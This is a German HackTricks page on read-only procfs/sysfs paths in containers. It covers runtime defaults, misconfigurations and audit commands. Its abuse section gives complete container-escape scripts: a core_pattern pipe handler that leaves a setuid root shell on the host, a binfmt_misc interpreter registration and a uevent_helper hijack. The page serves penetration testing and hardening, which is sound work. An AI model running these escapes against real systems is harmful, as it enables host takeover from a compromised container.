# Read-Only-Systempfade

{{#include ../../../../banners/hacktricks-training.md}}

Read-Only-Systempfade sind ein separater Schutzmechanismus gegenüber maskierten Pfaden. Anstatt einen Pfad vollständig zu verbergen, stellt die Runtime ihn bereit, mountet ihn jedoch als read-only. Dies ist bei ausgewählten procfs- und sysfs-Pfaden üblich, bei denen der Lesezugriff akzeptabel oder betrieblich erforderlich sein kann, Schreibzugriffe jedoch zu gefährlich wären.

Der Zweck ist unkompliziert: Viele Kernel-Schnittstellen werden deutlich gefährlicher, wenn sie beschreibbar sind. Ein read-only-Mount entfernt nicht den gesamten Reconnaissance-Wert, verhindert jedoch, dass eine kompromittierte Workload die zugrunde liegenden kernelbezogenen Dateien über diesen Pfad verändert.

## Betrieb

Runtimes markieren Teile der proc/sys-Ansicht häufig als read-only. Je nach Runtime und Host können dazu Pfade wie die folgenden gehören:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Die tatsächliche Liste variiert, aber das Modell ist dasselbe: Sichtbarkeit dort ermöglichen, wo sie benötigt wird, und standardmäßig Änderungen verweigern.<sup>[[1]](#references)</sup>

## Lab

Untersuche die von Docker deklarierte read-only-Pfadliste:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Untersuchen Sie die eingehängte proc/sys-Ansicht aus dem Container heraus:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Sicherheitsauswirkungen

Read-only-Systempfade schränken eine große Klasse von Missbrauch mit Auswirkungen auf den Host ein. Selbst wenn ein Angreifer procfs oder sysfs inspizieren kann, entfallen durch die fehlende Schreibmöglichkeit viele direkte Änderungspfade, die Kernel-Tunables, Crash-Handler, Module-Loading-Helper oder andere Steuerungsschnittstellen betreffen. Die Angriffsfläche ist damit nicht verschwunden, aber der Übergang von der Offenlegung von Informationen zur Einflussnahme auf den Host wird erschwert.

## Fehlkonfigurationen

Die häufigsten Fehler sind das Aufheben der Maskierung oder das erneute Einhängen sensibler Pfade mit Schreibzugriff, die direkte Freigabe von proc-/sys-Inhalten des Hosts über beschreibbare Bind-Mounts oder die Verwendung privilegierter Modi, die die sichereren Runtime-Standardeinstellungen faktisch umgehen. In Kubernetes treten `procMount: Unmasked` und privilegierte Workloads häufig gemeinsam mit einem schwächeren proc-Schutz auf.<sup>[[2]](#references)</sup> Ein weiterer häufiger Fehler im Betrieb besteht darin anzunehmen, dass alle Workloads weiterhin diesen Standard erben, nur weil die Runtime diese Pfade normalerweise read-only mountet.

## Missbrauch

Wenn der Schutz schwach ist, sollte zunächst nach beschreibbaren proc-/sys-Einträgen gesucht werden:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Wenn beschreibbare Einträge vorhanden sind, umfassen besonders wertvolle weiterführende Pfade:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Was diese Befehle offenlegen können:

- Schreibbare Einträge unter `/proc/sys` bedeuten oft, dass der Container das Verhalten des Host-Kernels ändern kann, anstatt es lediglich zu untersuchen.
- `core_pattern` ist besonders wichtig, weil ein schreibbarer, hostseitig ausgerichteter Wert nach dem Setzen eines Pipe-Handlers und dem anschließenden Absturz eines Prozesses in einen Host-Codeausführungspfad umgewandelt werden kann.
- `modprobe` zeigt den vom Kernel für Abläufe im Zusammenhang mit dem Laden von Modulen verwendeten Helfer. Wenn dieser schreibbar ist, stellt er ein klassisches, hochwertiges Ziel dar.
- `binfmt_misc` zeigt, ob die Registrierung benutzerdefinierter Interpreter möglich ist. Wenn die Registrierung schreibbar ist, kann daraus eine Ausführungsprimitive statt nur eines Information Leaks werden.
- `panic_on_oom` steuert eine hostweite Kernel-Entscheidung und kann daher Ressourcenerschöpfung in einen Denial of Service des Hosts umwandeln.
- `uevent_helper` ist eines der deutlichsten Beispiele dafür, dass ein schreibbarer sysfs-Helferpfad eine Ausführung im Host-Kontext ermöglicht.

Zu den interessanten Ergebnissen gehören schreibbare hostseitig ausgerichtete Proc-Knobs oder sysfs-Einträge, die normalerweise schreibgeschützt sein sollten. Ab diesem Punkt hat sich die Workload von einer eingeschränkten Container-Ansicht hin zu einem maßgeblichen Einfluss auf den Kernel bewegt.

### Vollständiges Beispiel: `core_pattern` Host Escape

Wenn `/proc/sys/kernel/core_pattern` innerhalb des Containers schreibbar ist und auf die Sicht des Host-Kernels verweist, kann es missbraucht werden, um nach einem Absturz ein Payload auszuführen:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Wenn der Pfad tatsächlich den Host-Kernel erreicht, wird das Payload auf dem Host ausgeführt und hinterlässt eine setuid shell.

### Vollständiges Beispiel: `binfmt_misc`-Registrierung

Wenn `/proc/sys/fs/binfmt_misc/register` beschreibbar ist, kann eine benutzerdefinierte Interpreter-Registrierung eine Codeausführung ermöglichen, sobald die passende Datei ausgeführt wird:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Bei einem hostseitig erreichbaren, beschreibbaren `binfmt_misc` ist das Ergebnis die Codeausführung im vom Kernel ausgelösten Interpreter-Pfad.

### Vollständiges Beispiel: `uevent_helper`

Wenn `/sys/kernel/uevent_helper` beschreibbar ist, kann der Kernel einen Helper unter einem Host-Pfad aufrufen, sobald ein passendes Ereignis ausgelöst wird:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Der Grund, warum dies so gefährlich ist, liegt darin, dass der Hilfspfad aus der Perspektive des Host-Dateisystems und nicht aus einem sicheren, ausschließlich containerinternen Kontext aufgelöst wird.

## Prüfungen

Diese Prüfungen bestimmen, ob die Freigabe von procfs/sysfs erwartungsgemäß schreibgeschützt ist und ob der Workload weiterhin sensible Kernel-Schnittstellen ändern kann.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Was ist hier interessant:

- Ein normaler hardened Workload sollte nur sehr wenige schreibbare proc/sys-Einträge offenlegen.
- Schreibbare `/proc/sys`-Pfade sind oft wichtiger als gewöhnlicher Lesezugriff.
- Wenn die Runtime angibt, dass ein Pfad schreibgeschützt ist, er in der Praxis aber beschreibbar ist, sollten Mount-Propagation, Bind-Mounts und Privilege-Einstellungen sorgfältig überprüft werden.

## Laufzeitstandards

| Runtime / Plattform | Standardstatus | Standardverhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig aktiviert | Docker definiert eine standardmäßige schreibgeschützte Pfadliste für sensible proc-Einträge | Host-proc/sys-Mounts offenlegen, `--privileged` |
| Podman | Standardmäßig aktiviert | Podman wendet standardmäßige schreibgeschützte Pfade an, sofern sie nicht explizit gelockert werden | `--security-opt unmask=ALL`, weitreichende Host-Mounts, `--privileged` |
| Kubernetes | Übernimmt Runtime-Standards | Verwendet das zugrunde liegende schreibgeschützte Pfadmodell der Runtime, sofern es nicht durch Pod-Einstellungen oder Host-Mounts abgeschwächt wird | `procMount: Unmasked`, privilegierte Workloads, schreibbare Host-proc/sys-Mounts |
| containerd / CRI-O unter Kubernetes | Runtime-Standard | Vertraut normalerweise auf OCI-/Runtime-Standards | wie in der Kubernetes-Zeile; direkte Änderungen an der Runtime-Konfiguration können das Verhalten abschwächen |

Der entscheidende Punkt ist, dass schreibgeschützte Systempfade normalerweise als Runtime-Standard vorhanden sind, aber durch privilegierte Modi oder Host-Bind-Mounts leicht unterlaufen werden können.

## Referenzen

- [1] [OCI Runtime Specification: Linux Container Configuration (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
- [2] [Kubernetes API Reference: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)

{{#include ../../../../banners/hacktricks-training.md}}
